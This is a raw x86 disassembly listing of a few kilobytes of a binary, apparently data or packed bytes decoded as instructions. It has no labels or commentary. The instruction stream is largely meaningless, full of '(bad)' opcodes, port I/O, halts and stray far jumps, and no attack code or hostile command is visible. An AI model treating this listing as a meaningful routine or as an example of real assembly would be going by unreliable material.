  415b1d:	int3   
  415b1e:	pop    es
  415b1f:	out    dx,al
  415b20:	out    dx,al
  415b21:	out    dx,al
  415b22:	xlat   BYTE PTR ds:[ebx]
  415b23:	mov    edi,0x909f4ea
  415b28:	or     ebx,ebx
  415b2a:	or     eax,ebp
  415b2c:	jmp    0xe7f4:0xf4f4e709
  415b33:	hlt    
  415b34:	hlt    
  415b35:	hlt    
  415b36:	out    0xe7,eax
  415b38:	hlt    
  415b39:	jmp    0x2200:0x9504a1af
  415b40:	fwait
  415b41:	xchg   edi,eax
  415b42:	fwait
  415b43:	xchg   esp,eax
  415b44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415b45:	mov    ah,0x96
  415b47:	test   al,0xb6
  415b49:	mov    dh,0xb6
  415b4b:	mov    esp,0xbbb3bbb6
  415b50:	mov    ebx,0xcbba0dd0
  415b55:	(bad)  
  415b57:	fcomi  st,st(2)
  415b59:	rcl    ebx,cl
  415b5b:	shl    ecx,cl
  415b5d:	shl    ebp,cl
  415b5f:	in     eax,0xe6
  415b61:	retf   0x0
  415b64:	add    BYTE PTR [edx],ah
  415b66:	xchg   edx,eax
  415b67:	std    
  415b68:	xchg   edx,eax
  415b69:	xchg   edx,eax
  415b6a:	xchg   edx,eax
  415b6b:	mov    WORD PTR [ebx+eax*4-0x74867475],fs
  415b72:	mov    ecx,DWORD PTR [ebx-0x111e427d]
  415b78:	out    dx,al
  415b79:	loope  0x415b74
  415b7b:	into   
  415b7c:	loope  0x415b48
  415b7e:	imul   dl
  415b80:	or     DWORD PTR [ecx],ecx
  415b82:	fisttp DWORD PTR [ecx]
  415b84:	call   0xa4a6492
  415b89:	hlt    
  415b8a:	add    BYTE PTR [edi],dl
  415b8c:	out    0xe7,eax
  415b8e:	out    0xd6,eax
  415b90:	out    0xe0,eax
  415b92:	lods   eax,DWORD PTR ds:[esi]
  415b93:	mov    eax,ds:0x9b959595
  415b98:	xchg   ebp,eax
  415b99:	cwde   
  415b9a:	out    dx,al
  415b9b:	out    dx,al
  415b9c:	fdiv   st,st(5)
  415b9e:	fsubrp st(5),st
  415ba0:	rcl    ebx,cl
  415ba2:	rol    DWORD PTR [eax],cl
  415ba4:	add    al,0xe5
  415ba6:	add    esi,esp
  415ba8:	add    ebp,esp
  415baa:	or     bl,dl
  415bac:	add    BYTE PTR [edi],al
  415bae:	xlat   BYTE PTR ds:[ebx]
  415baf:	mov    bh,0xd9
  415bb1:	sar    DWORD PTR [ebx+0x89b6],1
  415bb7:	add    BYTE PTR [eax],al
  415bb9:	pop    eax
  415bba:	std    
  415bbb:	mov    ?,ebp
  415bbd:	xchg   edx,eax
  415bbe:	std    
  415bbf:	xor    DWORD PTR [ebx-0x76],0x79bd8b83
  415bc6:	mov    eax,DWORD PTR [ebx-0x11f84276]
  415bcc:	out    dx,al
  415bcd:	out    dx,al
  415bce:	fadd   DWORD PTR [edi]
  415bd0:	out    dx,al
  415bd1:	or     cl,BYTE PTR [edx]
  415bd3:	or     esp,esi
  415bd5:	or     DWORD PTR [ecx],ecx
  415bd7:	or     eax,ebp
  415bd9:	or     eax,ebp
  415bdb:	or     DWORD PTR [ecx],ecx
  415bdd:	or     esp,esi
  415bdf:	or     esp,esi
  415be1:	hlt    
  415be2:	hlt    
  415be3:	out    0xe7,eax
  415be5:	out    0xf4,eax
  415be7:	hlt    
  415be8:	out    0xc4,eax
  415bea:	jmp    0x95a1:0xad03d6d6
  415bf1:	xchg   ebp,eax
  415bf2:	xchg   ebp,eax
  415bf3:	int3   
  415bf4:	fdivr  st(5),st
  415bf6:	fsubr  st(6),st
  415bf8:	in     eax,0xe5
  415bfa:	shl    ecx,cl
  415bfc:	icebp  
  415bfd:	icebp  
  415bfe:	out    0xdf,al
  415c00:	out    0xde,al
  415c02:	in     eax,0xe5
  415c04:	fucomi st,st(1)
  415c06:	fnstcw WORD PTR [ecx-0x544e4c33]
  415c0c:	test   eax,0x8181878c
  415c11:	xchg   DWORD PTR [eax],eax
  415c13:	add    BYTE PTR [eax],al
  415c15:	sbb    ecx,DWORD PTR [esi-0x6d6d0203]
  415c1b:	std    
  415c1c:	mov    DWORD PTR [ebx+ecx*4-0x7c7c747d],esp
  415c23:	mov    cl,BYTE PTR [edx+0x10e307bd]
  415c29:	adc    BYTE PTR [eax],dl
  415c2b:	adc    al,0x14
  415c2d:	adc    BYTE PTR [edi],al
  415c2f:	jmp    0x9475d28
  415c34:	add    eax,ebp
  415c36:	add    DWORD PTR [ecx],ecx
  415c38:	pop    es
  415c39:	hlt    
  415c3a:	add    BYTE PTR [edi+eiz*8],ah
  415c3d:	hlt    
  415c3e:	out    0xe7,eax
  415c40:	jmp    0xd6e0:0xd6d60303
  415c47:	(bad)  
  415c48:	mov    eax,0xede1a1a5
  415c4d:	stos   BYTE PTR es:[edi],al
  415c4e:	rcr    edx,0xd1
  415c51:	rcl    al,1
  415c53:	mov    bl,0xd0
  415c55:	mov    ebx,0xbcb6bbbc
  415c5a:	mov    dh,0xb1
  415c5c:	stos   DWORD PTR es:[edi],eax
  415c5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c5e:	test   eax,0xfd059a
  415c63:	add    eax,0xa78e8101
  415c68:	stos   DWORD PTR es:[edi],eax
  415c69:	add    BYTE PTR [eax],al
  415c6b:	add    BYTE PTR [eax],al
  415c6d:	xor    ebp,edi
  415c6f:	mov    ss,WORD PTR [edx-0x2026d6e]
  415c75:	je     0x415c01
  415c77:	cmp    DWORD PTR [eax],0x79
  415c7a:	js     0x415ccc
  415c7c:	jno    0x415cef
  415c7e:	adc    al,0x1e
  415c80:	cmp    al,0x4f
  415c82:	cmp    al,0x1e
  415c84:	imul   edx,DWORD PTR [ebp+0x6b],0x14
  415c88:	pop    es
  415c89:	or     DWORD PTR [ecx],ecx
  415c8b:	or     ebx,ebx
  415c8d:	fisttp DWORD PTR [ecx]
  415c8f:	hlt    
  415c90:	fisttp DWORD PTR [ecx]
  415c92:	hlt    
  415c93:	hlt    
  415c94:	or     esp,esi
  415c96:	or     edi,esp
  415c98:	hlt    
  415c99:	out    0xf4,eax
  415c9b:	out    0xe7,eax
  415c9d:	(bad)  
  415c9e:	jmp    0xbf12:0xd60400
  415ca5:	(bad)  
  415ca6:	(bad)  
  415ca7:	fisub  DWORD PTR [esi+edx*4-0x2650159]
  415cae:	cmp    ebp,0x87878181
  415cb4:	xchg   DWORD PTR [ebp+0x4],ebp
  415cb7:	add    DWORD PTR ds:0x8e0800fd,0xb3a8aba7
  415cc1:	or     eax,0xcada
  415cc6:	add    BYTE PTR [esi],ah
  415cc8:	std    
  415cc9:	std    
  415cca:	xchg   edx,eax
  415ccb:	xchg   edx,eax
  415ccc:	std    
  415ccd:	std    
  415cce:	jg     0x415c56
  415cd0:	jl     0x415d09
  415cd2:	sub    ebp,DWORD PTR [ebx+0x1e]
  415cd5:	cmp    al,0x3c
  415cd7:	cmp    al,0x17
  415cd9:	cmp    al,0x6b
  415cdb:	cmp    al,0x6b
  415cdd:	imul   ecx,DWORD PTR [edi+0x1e],0x6b
  415ce1:	push   ds
  415ce2:	sub    edx,DWORD PTR [edi+ebx*8]
  415ce5:	or     esp,esi
  415ce7:	or     DWORD PTR [ecx],ecx
  415ce9:	fisttp DWORD PTR [ecx]
  415ceb:	hlt    
  415cec:	hlt    
  415ced:	or     DWORD PTR [esp+esi*8],eax
  415cf0:	add    BYTE PTR [edi+eiz*8],dl
  415cf3:	out    0xe7,eax
  415cf5:	jmp    0xe0c6:0xe003d6c4
  415cfc:	loopne 0x415cd4
  415cfe:	(bad)  
  415cff:	retf   
  415d00:	mov    ah,0x65
  415d02:	jg     0x415c8d
  415d04:	xchg   edx,eax
  415d05:	xchg   edx,eax
  415d06:	add    al,0x8e
  415d08:	add    BYTE PTR [esi],dl
  415d0a:	mov    WORD PTR [esi+edi*2-0x7ec673bf],cs
  415d11:	or     DWORD PTR [esi-0x494b5872],0xc8d7dad0
  415d1b:	shl    ebp,cl
  415d1d:	rcl    ebx,cl
  415d1f:	in     eax,0x0
  415d21:	add    BYTE PTR [eax],al
  415d23:	and    dl,BYTE PTR [edx-0x102026e]
  415d29:	xchg   BYTE PTR [ecx+0x1e],dh
  415d2c:	ja     0x415d4c
  415d2e:	ja     0x415d6c
  415d30:	push   ds
  415d31:	push   ds
  415d32:	push   ebp
  415d33:	push   ebp
  415d34:	cmp    al,0x1e
  415d36:	cmp    al,0x6b
  415d38:	cmp    al,0x4f
  415d3a:	push   ds
  415d3b:	imul   ebx,DWORD PTR [esi],0x4f
  415d3e:	push   ds
  415d3f:	imul   ebx,DWORD PTR [esi],0x10
  415d42:	or     esp,esi
  415d44:	hlt    
  415d45:	call   0x2942514e
  415d4a:	out    0x9,eax
  415d4c:	out    0xe7,eax
  415d4e:	out    0xf4,eax
  415d50:	jmp    0xe0d6:0x3d6d6e7
  415d57:	loopne 0x415d39
  415d59:	(bad)  
  415d5a:	mov    esi,0x7e73b4cd
  415d5f:	add    DWORD PTR [ecx-0x36d7172],0xb4aba78c
  415d69:	mov    ah,0xa8
  415d6b:	mov    dh,0xbb
  415d6d:	rcl    cl,1
  415d6f:	fcmovu st,st(1)
  415d71:	fild   DWORD PTR [edx]
  415d73:	add    BYTE PTR [esi],al
  415d75:	rol    DWORD PTR [eax],cl
  415d77:	add    esi,ecx
  415d79:	(bad)
  415d7c:	add    BYTE PTR [eax],al
  415d7e:	add    BYTE PTR ds:0x89fdfdfd,ah
  415d84:	outs   dx,BYTE PTR es:[esi]
  415d86:	cmp    eax,0x553c1e6e
  415d8b:	dec    edi
  415d8c:	push   ds
  415d8d:	push   ebp
  415d8e:	imul   edi,DWORD PTR [edi+ecx*2],0x6b
  415d92:	imul   ebx,DWORD PTR [esi],0x4f
  415d95:	push   ebp
  415d96:	push   ds
  415d97:	dec    edi
  415d98:	push   ds
  415d99:	push   ebp
  415d9a:	imul   ebx,DWORD PTR [esi],0x53
  415d9d:	push   ds
  415d9e:	pop    ss
  415d9f:	psubsb mm6,mm4
  415da2:	hlt    
  415da3:	or     DWORD PTR [ecx],ecx
  415da5:	add    BYTE PTR [esi],al
  415da7:	hlt    
  415da8:	add    BYTE PTR ds:0x3d6e7ea,al
  415dae:	(bad)  
  415daf:	add    BYTE PTR ds:0xd60e00e0,al
  415db5:	(bad)  
  415db6:	rol    BYTE PTR [eax-0x4444578d],1
  415dbc:	mov    dl,0xcd
  415dbe:	int    0xd9
  415dc0:	fincstp 
  415dc2:	add    al,0xdf
  415dc4:	add    BYTE PTR [ebx],al
  415dc6:	out    0xe5,al
  415dc8:	in     eax,0x0
  415dca:	add    al,0xd3
  415dcc:	add    BYTE PTR [edx],cl
  415dce:	rcl    bl,cl
  415dd0:	rcr    ebx,cl
  415dd2:	xlat   BYTE PTR ds:[ebx]
  415dd3:	fcmove st,st(5)
  415dd5:	mov    dh,0xb4
  415dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dd8:	add    BYTE PTR [eax],al
  415dda:	add    BYTE PTR [eax-0x6e],bl
  415ddd:	add    DWORD PTR [edi+0x26],edi
  415de0:	dec    ecx
  415de1:	push   0x49
  415de3:	dec    ecx
  415de4:	outs   dx,BYTE PTR ds:[esi]
  415de5:	dec    edi
  415de6:	push   ds
  415de7:	push   ds
  415de8:	push   ebp
  415de9:	push   ds
  415dea:	push   ds
  415deb:	push   ebp
  415dec:	push   ds
  415ded:	push   ds
  415dee:	dec    edi
  415def:	dec    edi
  415df0:	push   ds
  415df1:	dec    edi
  415df2:	push   ebp
  415df3:	push   ebp
  415df4:	dec    edi
  415df5:	push   ds
  415df6:	imul   ebx,DWORD PTR [esi],0x1e
  415df9:	push   ebx
  415dfa:	cmp    al,0x14
  415dfc:	iret   
  415dfd:	push   cs
  415dfe:	hlt    
  415dff:	out    0xe7,eax
  415e01:	hlt    
  415e02:	hlt    
  415e03:	jmp    0xe7d6:0xe7e7e7f4
  415e0a:	loopne 0x415dec
  415e0c:	loopne 0x415dcd
  415e0e:	loopne 0x415dd9
  415e10:	loopne 0x415de8
  415e12:	(bad)  
  415e13:	sar    DWORD PTR [ebp-0x2c1a2113],1
  415e19:	icebp  
  415e1a:	shl    ecx,cl
  415e1c:	shl    ebp,cl
  415e1e:	out    0xf5,al
  415e20:	cmc    
  415e21:	cmc    
  415e22:	out    0xe6,al
  415e24:	in     eax,0xe5
  415e26:	icebp  
  415e27:	rcr    bl,cl
  415e29:	xlat   BYTE PTR ds:[ebx]
  415e2a:	fcmovbe st,st(0)
  415e2c:	mov    bl,0xae
  415e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e2f:	call   0x0:0xfd81818e
  415e36:	add    BYTE PTR ds:0x3b2c57fd,bh
  415e3c:	dec    esi
  415e3d:	dec    esi
  415e3e:	pop    ebp
  415e3f:	pop    ebp
  415e40:	aaa    
  415e41:	cmp    eax,0x556b5555
  415e46:	push   ebp
  415e47:	push   ds
  415e48:	imul   ebx,DWORD PTR [esi],0x1e
  415e4b:	push   ds
  415e4c:	push   ebp
  415e4d:	cmp    al,0x6b
  415e4f:	push   ds
  415e50:	push   ds
  415e51:	imul   edx,DWORD PTR [ebp+0x3c],0x4f
  415e55:	cmp    al,0x6b
  415e57:	push   ds
  415e58:	imul   edx,DWORD PTR [ebx+0x11],0x6
  415e5c:	out    0xe7,eax
  415e5e:	or     edi,esp
  415e60:	hlt    
  415e61:	out    0xe7,eax
  415e63:	add    ebp,edx
  415e65:	(bad)  
  415e66:	leave  
  415e67:	loopne 0x415e32
  415e69:	loopne 0x415e34
  415e6b:	leave  
  415e6c:	loopne 0x415e4e
  415e6e:	loopne 0x415e65
  415e70:	out    0xf5,al
  415e72:	in     eax,0xe5
  415e74:	icebp  
  415e75:	add    BYTE PTR [ebx+edx*8],al
  415e78:	add    BYTE PTR [edi],dl
  415e7a:	(bad)
  415e7d:	(bad)  
  415e7f:	retf   0xdaf7
  415e82:	int    0xbb
  415e84:	mov    bl,0xb4
  415e86:	test   eax,0x81fd8187
  415e8b:	or     DWORD PTR [esi-0x7102027f],0x0
  415e95:	daa    
  415e96:	inc    esp
  415e97:	sub    ah,BYTE PTR [ebx]
  415e99:	pop    ds
  415e9a:	and    dl,BYTE PTR [ecx+0x4b]
  415e9d:	inc    edx
  415e9e:	push   ecx
  415e9f:	pop    eax
  415ea0:	push   0x4d
  415ea2:	outs   dx,BYTE PTR ds:[esi]
  415ea3:	push   esi
  415ea4:	dec    ebp
  415ea5:	dec    edi
  415ea6:	cmp    al,0x4d
  415ea8:	outs   dx,BYTE PTR ds:[esi]
  415ea9:	push   ebp
  415eaa:	push   ebp
  415eab:	dec    edi
  415eac:	push   ebp
  415ead:	dec    edi
  415eae:	push   ebp
  415eaf:	cmp    al,0x4f
  415eb1:	cmp    al,0x1e
  415eb3:	push   ds
  415eb4:	push   ds
  415eb5:	imul   ebx,DWORD PTR [esi],0x53
  415eb8:	push   ds
  415eb9:	adc    al,0x10
  415ebb:	fucomip st,st(2)
  415ebd:	add    BYTE PTR [edi+eiz*8],al
  415ec0:	add    BYTE PTR [edx+ebp*8],dl
  415ec3:	(bad)  
  415ec4:	loopne 0x415ea6
  415ec6:	mov    eax,0xc9b8b905
  415ecb:	loopne 0x415e96
  415ecd:	(bad)
  415ed0:	(bad)
  415ed3:	mov    ebx,0xb405b6b6
  415ed8:	add    BYTE PTR [esi+edx*4],dl
  415edb:	stos   DWORD PTR es:[edi],eax
  415edc:	lea    esp,[edi+0x1fd8efe]
  415ee2:	add    DWORD PTR [ecx-0x7171027f],eax
  415ee8:	test   eax,0xb2bbb6ab
  415eed:	int    0x0
  415eef:	add    BYTE PTR [eax],al
  415ef1:	sbb    eax,0x22202323
  415ef6:	dec    ebx
  415ef7:	dec    ebx
  415ef8:	push   esp
  415ef9:	inc    esi
  415efa:	dec    ebx
  415efb:	imul   edx,DWORD PTR [ecx+0x58],0x6e6e5656
  415f02:	push   esi
  415f03:	push   esi
  415f04:	dec    ebp
  415f05:	push   esi
  415f06:	push   esi
  415f07:	push   esi
  415f08:	dec    ebp
  415f09:	dec    ebp
  415f0a:	dec    edi
  415f0b:	push   ebp
  415f0c:	cmp    al,0x55
  415f0e:	push   ds
  415f0f:	add    BYTE PTR [esi],al
  415f11:	dec    edi
  415f12:	add    BYTE PTR ds:0x11144f6b,dh
  415f18:	fld    DWORD PTR [ebx]
  415f1a:	add    eax,DWORD PTR [ebx]
  415f1c:	loopne 0x415f21
  415f1e:	loopne 0x415ed8
  415f20:	leave  
  415f21:	mov    ecx,0xb8c905b8
  415f26:	leave  
  415f27:	fadd   st,st(1)
  415f29:	mov    esp,0xfdfd8cab
  415f2e:	add    DWORD PTR [ecx],0x8c398181
  415f34:	mov    DWORD PTR [esi-0x2027172],ecx
  415f3a:	add    ebp,edi
  415f3c:	mov    cs,WORD PTR [ebx+ebp*4+0xdbbb6b1]
  415f43:	fld1   
  415f45:	shl    edx,cl
  415f47:	rcl    ebx,cl
  415f49:	add    BYTE PTR [eax],al
  415f4b:	add    BYTE PTR [eax],al
  415f4d:	pop    eax
  415f4e:	cmp    esp,DWORD PTR [ebx]
  415f50:	dec    esp
  415f51:	cmp    cl,BYTE PTR [ebx+0x54]
  415f54:	inc    esi
  415f55:	push   esp
  415f56:	push   esp
  415f57:	dec    ebx
  415f58:	push   esp
  415f59:	dec    ebx
  415f5a:	push   ecx
  415f5b:	pop    ebp
  415f5c:	push   0x56
  415f5e:	push   0x56
  415f60:	pop    ebp
  415f61:	push   0x5d
  415f63:	das    
  415f64:	pop    ebp
  415f65:	push   0x56
  415f67:	push   esi
  415f68:	push   0x25
  415f6a:	push   0x49
  415f6c:	dec    ecx
  415f6d:	dec    ecx
  415f6e:	and    eax,0x5d495649
  415f73:	push   esi
  415f74:	push   0x3f
  415f76:	pmovmskb edx,mm6
  415f79:	loopne 0x415f5b
  415f7b:	leave  
  415f7c:	loopne 0x415f47
  415f7e:	mov    edx,0xe005b8b9
  415f83:	add    eax,0x818e80a8
  415f88:	mov    ?,esi
  415f8a:	mov    cs,WORD PTR [esi-0x78020272]
  415f90:	mov    DWORD PTR [ecx+0x74807f7f],ecx
  415f96:	pusha  
  415f97:	lahf   
  415f98:	inc    ebp
  415f99:	mov    ebp,0xd3c5127c
  415f9e:	add    dl,bl
  415fa0:	(bad)
  415fa3:	rcl    dl,cl
  415fa5:	aad    0x0
  415fa7:	add    BYTE PTR [eax],al
  415fa9:	add    al,0x23
  415fab:	and    BYTE PTR [edx],ah
  415fad:	dec    ebx
  415fae:	add    al,0x54
  415fb0:	add    DWORD PTR [esi+0x1],eax
  415fb3:	push   esp
  415fb4:	add    al,0x4b
  415fb6:	add    BYTE PTR [ecx],dl
  415fb8:	push   ecx
  415fb9:	pop    ebx
  415fba:	pop    ebp
  415fbb:	pop    ebp
  415fbc:	pop    eax
  415fbd:	pop    ebx
  415fbe:	pop    ebp
  415fbf:	pop    eax
  415fc0:	pop    ebp
  415fc1:	pop    ebx
  415fc2:	pop    eax
  415fc3:	pop    ebx
  415fc4:	pop    eax
  415fc5:	pop    eax
  415fc6:	pop    ebx
  415fc7:	pop    eax
  415fc8:	pop    ebp
  415fc9:	add    BYTE PTR [edi],al
  415fcb:	pop    eax
  415fcc:	add    BYTE PTR [ecx],ch
  415fce:	inc    ebx
  415fcf:	pop    eax
  415fd0:	dec    ecx
  415fd1:	adc    ecx,DWORD PTR [ebx]
  415fd3:	add    eax,0xc9b805b8
  415fd8:	mov    ecx,0xe0c9b9ba
  415fdd:	or     eax,0xfd8c8973
  415fe2:	xchg   edx,eax
  415fe3:	inc    BYTE PTR [ecx+0x74]
  415fe6:	je     0x416054
  415fe8:	test   BYTE PTR [ebx+0x43502638],al
  415fee:	inc    ebx
  415fef:	and    eax,0x3d243d49
  415ff4:	cs dec ecx
  415ff6:	fild   WORD PTR [eax]
  415ff8:	add    al,0xe5
  415ffa:	add    BYTE PTR ds:0xb3d0cbc8,al
  416000:	mov    cl,0x0
  416002:	add    BYTE PTR [eax],al
  416004:	add    BYTE PTR [edx],cl
  416006:	and    BYTE PTR [edi],bl
  416008:	cmp    dl,BYTE PTR [esp+edx*2+0x4b]
  41600c:	push   esp
  41600d:	dec    ebx
  41600e:	dec    ebx
  41600f:	push   esp
  416010:	add    eax,0x2735004b
  416015:	push   ecx
  416016:	pop    ebx
  416017:	xor    al,0x5d
  416019:	pop    eax
  41601a:	pop    eax
  41601b:	pop    esp
  41601c:	pop    esp
  41601d:	pop    si
  41601f:	pop    esp
  416020:	popa   
  416021:	pop    esp
  416022:	popa   
  416023:	pop    esp
  416024:	popa   
  416025:	popa   
  416026:	pop    esp
  416027:	popa   
  416028:	popa   
  416029:	pop    esp
  41602a:	popa   
  41602b:	jbe    0x41608e
  41602d:	pop    eax
  41602e:	pop    eax
  41602f:	pop    eax
  416030:	mov    ebp,0xbababa0b
  416035:	mov    ecx,0xbfb8b8ba
  41603a:	mov    bl,0x7d
  41603c:	inc    ecx
  41603d:	mov    DWORD PTR [eax-0x7c],esp
  416040:	js     0x416081
  416042:	aaa    
  416043:	dec    ecx
  416044:	cs dec ebp
  416046:	cs dec ebp
  416048:	cmp    eax,0x2e0400
  41604d:	adc    BYTE PTR ds:0x4917562e,ah
  416053:	cmp    eax,0xbbcdc0f9
  416058:	mov    dh,0xae
  41605a:	test   eax,0x1fd8e
  41605f:	add    BYTE PTR [eax],al
  416061:	add    esp,DWORD PTR [eax]
  416063:	push   ecx
  416064:	dec    ebx
  416065:	add    BYTE PTR [esi],al
  416067:	push   esp
  416068:	add    DWORD PTR [ebx+0x1],ecx
  41606b:	inc    esi
  41606c:	add    eax,0x5112004b
  416071:	dec    ebx
  416072:	dec    esp
  416073:	popa   
  416074:	pop    ebx
  416075:	pop    esp
  416076:	pop    esi
  416077:	imul   ebx,DWORD PTR [esi+0x5e],0x5e5e5e5c
  41607e:	pop    esp
  41607f:	pop    esp
  416080:	popa   
  416081:	popa   
  416082:	add    eax,0x5e18005c
  416087:	pop    esp
  416088:	jbe    0x4160e2
  41608a:	popa   
  41608b:	push   eax
  41608c:	mov    ebp,0xbababada
  416091:	mov    eax,0x45c2ba05
  416096:	cmp    BYTE PTR [edi],bh
  416098:	and    eax,0x4d492e3d
  41609d:	cmp    eax,0x14002f05
  4160a2:	sbb    bl,BYTE PTR cs:[edx]
  4160a5:	push   esi
  4160a6:	cs push esi
  4160a8:	inc    ebp
  4160a9:	pusha  
  4160aa:	push   eax
  4160ab:	and    al,0x38
  4160ad:	cld    
  4160ae:	xchg   edx,eax
  4160af:	add    ebp,edi
  4160b1:	cmp    ebp,0x8181fd
  4160b7:	add    BYTE PTR [ecx],al
  4160b9:	and    al,BYTE PTR [ecx]
  4160bb:	dec    ebx
  4160bc:	add    al,0x54
  4160be:	add    BYTE PTR [ebx+ecx*2],al
  4160c1:	push   esp
  4160c2:	dec    ebx
  4160c3:	push   esp
  4160c4:	add    al,0x4b
  4160c6:	add    BYTE PTR [eax],cl
  4160c8:	push   ecx
  4160c9:	dec    ebx
  4160ca:	cmp    cl,BYTE PTR [ebx+0x6f]
  4160cd:	xchg   ebx,eax
  4160ce:	nop
  4160cf:	outs   dx,DWORD PTR ds:[esi]
  4160d0:	add    al,0x5e
  4160d2:	add    BYTE PTR [edi],al
  4160d4:	bound  esp,QWORD PTR [edx+0x5e]
  4160d7:	pop    esi
  4160d8:	pop    esp
  4160d9:	pop    esi
  4160da:	pop    esi
  4160db:	add    BYTE PTR ds:0x5e32005c,al
  4160e1:	pop    esp
  4160e2:	pop    esi
  4160e3:	pop    esp
  4160e4:	pop    esi
  4160e5:	push   eax
  4160e6:	pop    esp
  4160e7:	pop    eax
  4160e8:	push   eax
  4160e9:	rcr    edx,0xb5
  4160ec:	mov    eax,0x2e14c0b8
  4160f1:	cs cmp eax,0x56252e2e
  4160f7:	aas    
  4160f8:	pop    eax
  4160f9:	cs cs inc ebp
  4160fc:	inc    esp
  4160fd:	and    eax,0x267f452e
  416102:	das    
  416103:	and    eax,0x15268d45
  416108:	aas    
  416109:	jle    0x41610c
  41610b:	add    ebp,edi
  41610d:	std    
  41610e:	std    
  41610f:	mov    ds,WORD PTR [edx+0x10000a7]
  416115:	push   ecx
  416116:	add    DWORD PTR [ebx+0x6],ecx
  416119:	push   esp
  41611a:	add    BYTE PTR [esi+eax*2],al
  41611d:	dec    ebx
  41611e:	dec    ebx
  41611f:	push   esp
  416120:	add    al,0x4b
  416122:	add    DWORD PTR [esi+0x1],ebx
  416125:	xchg   ebx,eax
  416126:	add    al,0x97
  416128:	add    BYTE PTR [edi],al
  41612a:	xchg   ebx,eax
  41612b:	nop
  41612c:	bound  esp,QWORD PTR [edx+0x3e]
  41612f:	bound  esp,QWORD PTR [edx+0x0]
  416132:	add    al,0x5e
  416134:	add    DWORD PTR [edx+0x6],esp
  416137:	pop    esp
  416138:	add    BYTE PTR [eax],dh
  41613a:	pop    esi
  41613b:	outs   dx,DWORD PTR ds:[esi]
  41613c:	pop    esi
  41613d:	pop    esi
  41613e:	pop    esp
  41613f:	jbe    0x41616d
  416141:	push   eax
  416142:	pop    esp
  416143:	es mov ebp,0x3d2411da
  416149:	das    
  41614a:	and    eax,0x252e3844
  41614f:	pusha  
  416150:	inc    esp
  416151:	and    eax,0x5084381a
  416156:	inc    ebp
  416157:	cmp    BYTE PTR [eax],bh
  416159:	xor    al,0x45
  41615b:	jae    0x416177
  41615d:	and    eax,0xc22b562f
  416162:	mov    dh,0xb3
  416164:	mov    bl,0xd0
  416166:	ror    ch,1
  416168:	retf   
  416169:	xlat   BYTE PTR ds:[ebx]
  41616a:	add    BYTE PTR [eax],al
  41616c:	add    DWORD PTR [ebx+0x8],ecx
  41616f:	push   esp
  416170:	add    BYTE PTR [edi],al
  416172:	dec    ebx
  416173:	push   esp
  416174:	dec    ebx
  416175:	push   esp
  416176:	dec    ebx
  416177:	dec    ebx
  416178:	mov    al,BYTE PTR [eax]
  41617a:	or     BYTE PTR [edi-0x70fe64ff],dl
  416180:	add    al,0x62
  416182:	add    BYTE PTR [esi],al
  416184:	pop    esi
  416185:	bound  esp,QWORD PTR [edx+0x5e]
  416188:	pop    esi
  416189:	pop    esp
  41618a:	push   es
  41618b:	pop    esi
  41618c:	add    BYTE PTR [edi],ah
  41618e:	pop    esp
  41618f:	pop    esi
  416190:	pop    esi
  416191:	pop    esi
  416192:	sub    al,0x5e
  416194:	pop    esp
  416195:	pop    esp
  416196:	pop    eax
  416197:	push   eax
  416198:	mov    ebp,0x43155845
  41619d:	add    BYTE PTR [ebp+0x26],0x26
  4161a1:	inc    ebx
  4161a2:	sbb    bh,BYTE PTR [eax]
  4161a4:	inc    ecx
  4161a5:	push   eax
  4161a6:	adc    eax,0x2e458943
  4161ab:	inc    ebx
  4161ac:	inc    ebp
  4161ad:	inc    esp
  4161ae:	inc    ebx
  4161af:	pop    edi
  4161b0:	inc    ebp
  4161b1:	das    
  4161b2:	and    eax,0x700d4d8
  4161b7:	rol    BYTE PTR [eax],cl
  4161b9:	add    BYTE PTR [ecx],al
  4161bb:	dec    ebx
  4161bc:	push   es
  4161bd:	push   esp
  4161be:	add    BYTE PTR [edx],cl
  4161c0:	dec    ebx
  4161c1:	push   esp
  4161c2:	push   esp
  4161c3:	push   esp
  4161c4:	dec    ebx
  4161c5:	dec    ebx
  4161c6:	inc    edi
  4161c7:	nop
  4161c8:	xchg   edi,eax
  4161c9:	pushf  
  4161ca:	or     DWORD PTR [edi+0x7a940400],edx
  4161d0:	inc    eax
  4161d1:	pop    esi
  4161d2:	add    eax,0x5e0462
  4161d7:	xor    DWORD PTR [edx+0x5e],esp
  4161da:	bound  ebx,QWORD PTR [esi+ebx*2+0x5e]
  4161de:	pop    esi
  4161df:	bound  ebx,QWORD PTR [esi+0x2c]
  4161e2:	pop    eax
  4161e3:	push   eax
  4161e4:	adc    edi,edx
  4161e6:	push   edi
  4161e7:	es es push eax
  4161ea:	pop    eax
  4161eb:	inc    ebx
  4161ec:	jg     0x416262
  4161ee:	dec    ecx
  4161ef:	and    eax,0x45504538
  4161f4:	cmp    BYTE PTR [ebx+eax*2],dh
  4161f7:	ins    BYTE PTR es:[edi],dx
  4161f8:	pop    edi
  4161f9:	cs cs push eax
  4161fc:	jae    0x41626a
  4161fe:	and    eax,0xd2d4072f
  416203:	shl    bl,cl
  416205:	repz ret 
  416207:	jmp    0x4161d4
  416209:	add    BYTE PTR [eax],al
  41620b:	add    BYTE PTR [ecx],al
  41620d:	dec    ebx
  41620e:	or     BYTE PTR [eax+eax*1+0x5],dl
  416212:	dec    ebx
  416213:	dec    ebx
  416214:	dec    ebx
  416215:	bound  ecx,QWORD PTR [edi+0x970a00]
  41621b:	or     eax,0xfe8d8d94
  416220:	and    BYTE PTR [eax+0x62],0x62
  416224:	bound  ebx,QWORD PTR [bp+0x62]
  416228:	pop    esi
  416229:	add    BYTE PTR [edx+eiz*2],al
  41622c:	add    al,0x5e
  41622e:	add    al,0x62
  416230:	add    BYTE PTR [edi],ah
  416232:	pop    esp
  416233:	pop    eax
  416234:	or     edx,DWORD PTR [ecx]
  416236:	xor    eax,0x2e6c7f34
  41623b:	inc    ebx
  41623c:	es es inc esp
  41623f:	ins    BYTE PTR es:[edi],dx
  416240:	and    eax,0x84012615
  416245:	das    
  416246:	and    eax,0x261a8444
  41624b:	inc    ebx
  41624c:	inc    ebx
  41624d:	inc    ebx
  41624e:	cs and eax,0xd0b2da08
  416254:	mov    bl,0xb1
  416256:	mov    ah,0xa7
  416258:	call   0xa4b:0x1000000
  41625f:	push   esp
  416260:	add    DWORD PTR [eax+0x1],esi
  416263:	fwait
